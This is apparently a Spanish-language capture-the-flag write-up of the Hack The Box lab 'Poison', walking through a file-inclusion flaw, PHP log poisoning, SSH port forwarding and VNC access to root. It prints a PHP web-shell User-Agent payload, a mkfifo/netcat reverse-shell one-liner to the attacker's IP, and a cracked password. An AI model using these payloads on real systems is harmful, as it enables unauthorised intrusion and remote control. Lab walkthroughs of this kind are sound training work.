---
layout: post
title: HTB Poison
date: '2023-12-28 17:16:44 -0500'
categories: [HTB, Medium]
tags: [Web, LFI , LogPoison , FreeBSD , VNC , Process , Pivoting , PortForwarding , Zip  , Crypto ] 
image:
  path: /poison/preview.png
  alt: Poison
---


## Resumen
![logo](/poison/logo.png){: .right w="200" h="200" }
**Poison** fue una máquina muy divertida. En un principio, se aprovecha una vulnerabilidad **web**, explotando un **LFI** que termina convirtiéndose en un **log poison**. Gracias a esto, se logra ejecutar comandos dentro del equipo para obtener una **shell reversa**. Una vez dentro del equipo, se descubre un archivo que contiene una contraseña **cifrada**, por lo que se intenta romperla. Posteriormente, parece ser la contraseña de un usuario del equipo, lo que proporciona acceso a través de **SSH**.

Con este acceso, se encuentra un archivo **zip** que aparenta contener algo interesante, al menos su nombre así lo indica. Después de revisar los **puertos abiertos** y los **procesos**, se evidencia un servicio de **VNC** corriendo de forma local. Por lo tanto, se decide exponerlo mediante **port forwarding** con ayuda de **SSH**.

Gracias a este proceso, se puede utilizar **vncviewer** con la credencial obtenida dentro del archivo **zip**. Esto proporciona una conexión como el usuario **root** y se completa la máquina.


## Reconocimiento

Se realiza un **ping** para saber si se cuenta con conectividad hacia la máquina.

```bash
ping 10.10.10.84 -c 1

PING 10.10.10.84 (10.10.10.84) 56(84) bytes of data.
64 bytes from 10.10.10.84: icmp_seq=1 ttl=63 time=268 ms

--- 10.10.10.84 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 268.246/268.246/268.246/0.000 ms
```
{: .nolineno}

### Escaneo de Puertos

Ahora se puede realizar un escaneo con **nmap** para ver qué puertos se encuentran abiertos.


```bash
nmap -p- --min-rate 5000 10.10.10.84 -Pn -oG portsTCP

Warning: 10.10.10.84 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.84
Host is up (0.17s latency).
Not shown: 60814 filtered tcp ports (no-response), 4719 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
{: .nolineno}

Después, se puede llevar a cabo un escaneo más profundo con **nmap** para identificar las tecnologías y versiones que utiliza cada uno.

```bash
nmap -p22,80 -sVC 10.10.10.84 -Pn -oN versions

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 17:46 EST
Nmap scan report for 10.10.10.84
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```
{: .nolineno}

## Enumeración
Para el puerto web, se puede analizar las tecnologías que utiliza la página web. Con esto, se observa que el servidor es FreeBSD y que está ejecutando un servidor Apache.

```bash
whatweb http://10.10.10.84

http://10.10.10.84 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.10.10.84], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```
{: .nolineno}


![web](/poison/web.png)


Se envía una entrada aleatoria a la página web y se observa que la misma presenta un fallo.

![test](/poison/test.png)


Dentro del fallo, se puede observar que el código hace uso de la función `include` en PHP, la cual permite abrir un archivo dentro del sistema. Además, se revela la ruta donde se encuentra alojado el código de la página web.

![fail](/poison/fail.png)

## Explotación


### LFI 

Con esto en mente, podría presentarse un LFI (Inclusión de Archivos Locales). Por lo tanto, se procede a revisar algunos archivos importantes dentro del equipo. Lo primero que se hace es revisar el archivo **/etc/passwd** para ver qué usuarios se encuentran dentro del sistema, y el único que parece tener una **shell** es el usuario **charix**.


> Un **LFI** es una vulnerabilidad que permite leer cualquier archivo que se encuentre dentro del mismo servidor, incluso si el archivo se encuentra fuera del directorio web donde está alojada la página.
{: .prompt-info}


![etcpasswd](/poison/etcpasswd.png)

También se puede intentar revisar el contenido del archivo que se está interpretando dentro de la web mediante el uso de wrappers.


```bash
http://10.10.10.84/browse.php?file=php://filter/convert.base64-encode/resource=/usr/local/www/apache24/data/browse.php
```
{: .nolineno}


![encode](/poison/encode.png)


Al intentar verlo en texto plano, se observa que simplemente se está haciendo uso de la función mencionada anteriormente y nada más.

```bash
echo PD9waHAKaW5jbHVkZSgkX0dFVFsnZmlsZSddKTsKPz4K | base64 -d
<?php
include($_GET['file']);
?>
```
{: .nolineno}



### Log Poisoning

Una forma de explotar una vulnerabilidad LFI puede ser a través de un log poisoning, donde se intenta cargar código malicioso dentro de los registros (logs) de la página web para luego lograr una ejecución de comandos. Sin embargo, para llevar a cabo este proceso, primero es necesario identificar en qué archivos se encuentran los registros del sistema. Se puede buscar en Google la ubicación específica para FreeBSD.

![logs](/poison/logs.png)


Ahora se puede enviar una petición especial con el fin de visualizar el contenido interpretado dentro del log. En este caso, se envía un user-agent con mi nombre para verificar si se refleja en el servidor.


```bash
curl -I "http://10.10.10.84/browse.php?file=/var/log/httpd-access.log" -A "MADLIES"

HTTP/1.1 200 OK
Date: Thu, 28 Dec 2023 23:20:52 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
X-Powered-By: PHP/5.6.32
Content-Type: text/html; charset=UTF-8
```
{: .nolineno}


![agent](/poison/agent.png)


Dado que se ha confirmado que funciona, ahora se desea enviar como cabecera una porción de código PHP para verificar si se interpreta, con el objetivo de explotar la vulnerabilidad dentro de la web. Y se hace que espere que se pase un **parámetro por la URL** que permita al usuario obtener un **web shell**. 


```bash
curl -I "http://10.10.10.84/browse.php?file=/var/log/httpd-access.log" -A "<?php system(\$_GET['cmd']); ?>"
HTTP/1.1 200 OK
Date: Thu, 28 Dec 2023 23:23:51 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
X-Powered-By: PHP/5.6.32
Content-Type: text/html; charset=UTF-8
```
{: .nolineno}


![poison](/poison/poison.png)

Gracias a esto, ya se puede ganar una **shell reversa**. Por lo tanto, el primer paso es ponerse a la escucha con **nc**.


```bash
nc -lvp 4444
```
{: .nolineno}



Luego, se puede poner este **payload** dentro del parámetro que creamos.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 4444 >/tmp/f
```
{: .nolineno}


Pero al ponerlo en la URL, es buena idea **urlencodearlo** para evitar problemas a la hora de interpretarse dentro del servidor.

```bash
view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.17%204444%20%3E%2Ftmp%2Ff
```
{: .nolineno}



Y si todo fue realizado de manera correcta, se puede ganar una **shell reversa** dentro del equipo.


```bash
nc -lvp 4444
listening on [any] 4444 ...
10.10.10.84: inverse host lookup failed: Host name lookup failure
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.84] 32976
sh: can't access tty; job control turned off
$ whoami
www
$ pwd
/usr/local/www/apache24/data
$ 
```
{: .nolineno}


## Escalada de Privilegios Charix

Ahora que se está dentro del equipo, se pueden enumerar los archivos y se ve que el **usuario** tiene un archivo interesante llamado **pwdbackup.txt**.
```bash
ls
browse.php
index.php
info.php
ini.php
listfiles.php
phpinfo.php
pwdbackup.txt
```
{: .nolineno}


Y al abrirlo, dice que es un archivo que fue cifrado 13 veces en algo que parece ser **base64**.

```bash
cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
```
{: .nolineno}

Por lo que se intenta descifrarlo de forma recursiva con ayuda de [cyberchef](https://cyberchef.io/), y se obtiene la **contraseña**. Esta contraseña puede pertenecerle al usuario **charix**, previamente enumerado.

![decrypt](/poison/decrypt.png)


Por lo que se puede intentar usar esas **credenciales** para conectarse por medio de **SSH**.


```bash
ssh charix@10.10.10.84
(charix@10.10.10.84) Password for charix@Poison: Charix!2#4%6&8(0
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
You can `set autologout = 30' to have tcsh log you off automatically
if you leave the shell idle for more than 30 minutes.
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ % 
```
{: .nolineno}

## Escalada de Privilegios Root

Ahora que se está dentro de la carpeta del usuario **charix**, se puede ver la **flag de usuario** y un archivo **zip** que podría contener algo interesante, ya que tiene un nombre llamativo. Por lo tanto, se puede intentar transferirlo a nuestra máquina atacante para analizarlo.


```bash
charix@Poison:~ % ls
secret.zip	user.txt
```
{: .nolineno}

Para esto, se monta un servidor HTTP con ayuda de **PHP** y se pone a la escucha en el puerto 8008.

```bash
php -S 0.0.0.0:8008
```
{: .nolineno}


Luego, se descarga al equipo atacante con **wget**.

```bash
wget http://10.10.10.84:8008/secret.zip
```
{: .nolineno}


Y al intentar descomprimirlo, nos damos cuenta de que necesitamos una contraseña. Por lo tanto, se puede intentar probar con las **credenciales del usuario** que se obtuvieron antes y se obtiene el contenido del archivo, que realmente en este punto no entiendo qué es. Pero se llama **secret**, por lo que podría ser importante.

```bash
unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: Charix!2#4%6&8(0 
 extracting: secret          
```
{: .nolineno}


Si se hace uso de **file** para ver qué tipo de archivo es, tampoco proporciona demasiada información.

```bash
file secret
secret: Non-ISO extended-ASCII text, with no line terminators
```
{: .nolineno}

Y ver el contenido tampoco ayuda mucho.

```bash
 ��[|Ֆz!
```
{: .nolineno}

Ahora, dentro del equipo, se puede ver qué puertos se encuentran siendo utilizados con ayuda de **netstat**, y de esto se puede ver algo llamativo. Ya que hay algo corriendo de manera local en los puertos 5801 y 5901.


```bash
 netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.10.10.84.22         10.10.14.17.35458      ESTABLISHED
tcp4       0      0 10.10.10.84.32976      10.10.14.17.4444       ESTABLISHED
tcp4       0      0 10.10.10.84.80         10.10.14.17.42840      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```
{: .nolineno}

Y al revisar los procesos, se puede unir con lo anterior, ya que hay un servicio de **VNC** corriendo en el puerto 5901 de manera local.


```bash
ps -faux

charix 877  0.0  0.8  85228  7816  -  S    01:56     0:00.02 sshd: charix@pts/1 (sshd)
root   529  0.0  0.9  23620  8872 v0- I    00:15     0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
root   540  0.0  0.7  67220  7064 v0- I    00:15     0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root   541  0.0  0.5  37620  5312 v0- I    00:15     0:00.01 twm
```
{: .nolineno}

> VNC es un programa de software libre basado en una estructura cliente-servidor que permite observar las acciones del ordenador servidor remotamente a través de un ordenador cliente.
{: .prompt-info}

Con esto en mente, se puede intentar hacer un **port forwarding** para que el contenido de los puertos se pueda ver de forma remota dentro del equipo atacante. Primero, se va a comprobar que no hay ningún puerto activado dentro de la máquina.


```bash
netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
udp        0      0 0.0.0.0:54793           0.0.0.0:*                           -                   
```
{: .nolineno}

Luego, se realiza un **port forwarding** dentro del equipo mediante **SSH** para que, de esta manera, el puerto de la víctima pase a ser mi puerto.

```bash
ssh charix@10.10.10.84 -L 5901:127.0.0.1:5901
(charix@10.10.10.84) Password for charix@Poison:
Last login: Fri Dec 29 02:08:23 2023 from 10.10.14.17
```
{: .nolineno}


Esto se revisa con ayuda de **netstat**


```bash
netstat -tunlp

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      188077/ssh          
tcp6       0      0 ::1:5901                :::*                    LISTEN      188077/ssh          
udp        0      0 0.0.0.0:54793           0.0.0.0:*                           -                   
```
{: .nolineno}


Ahora podemos intentar conectarnos al servicio con ayuda de **vncviewer**, pero primero es necesario ver qué es necesario para realizar la conexión.

```bash
vncviewer --help
TightVNC Viewer version 1.3.10

Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       vncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
        -encodings <ENCODING-LIST> (e.g. "tight copyrect")
        -bgr233
        -owncmap
        -truecolour
        -depth <DEPTH>
        -compresslevel <COMPRESS-VALUE> (0..9: 0-fast, 9-best)
        -quality <JPEG-QUALITY-VALUE> (0..9: 0-low, 9-high)
        -nojpeg
        -nocursorshape
        -x11cursor
        -autopass

Option names may be abbreviated, e.g. -bgr instead of -bgr233.
See the manual page for more information.
```
{: .nolineno}


Teniendo en cuenta que antes conseguimos algo que podría ser el archivo de contraseña, podríamos intentar conectarnos al servicio indicando la IP y el puerto del servicio, además de la **contraseña** que se consiguió del zip.

```bash
vncviewer  127.0.0.1:5901 -passwd secret
```
{: .nolineno}

Y finalmente, se logra la conexión como **root** dentro del equipo gracias a **VNC**.

![vnc](/poison/vnc.png)








